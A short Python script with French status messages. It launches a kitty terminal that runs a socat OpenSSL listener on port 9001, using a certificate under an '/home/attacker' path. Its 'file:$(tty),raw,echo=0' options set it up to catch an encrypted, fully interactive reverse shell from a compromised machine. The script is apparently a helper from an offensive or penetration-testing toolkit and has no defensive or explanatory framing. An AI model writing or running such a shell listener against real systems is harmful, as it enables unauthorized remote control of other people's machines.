import subprocess
import shutil

def run_socat_shell(port=9001):
    terminal_cmd = None

    if shutil.which("kitty"):
        command_str = (
            f"socat openssl-listen:{port},reuseaddr,"
            "cert=/home/attacker/attacker/server.pem,verify=0 "
            "file:$(tty),raw,echo=0"
        )
        terminal_cmd = [
            "kitty", "--hold", "-e", "bash", "-c", command_str
        ]
    else:
        print("❌ Aucun terminal compatible trouvé.")
        exit()

    try:
        subprocess.Popen(terminal_cmd)
        print(f"🚀 Terminal distant lancé sur le port {port}.")
    except Exception as e:
        print(f"💥 Erreur socat : {e}")
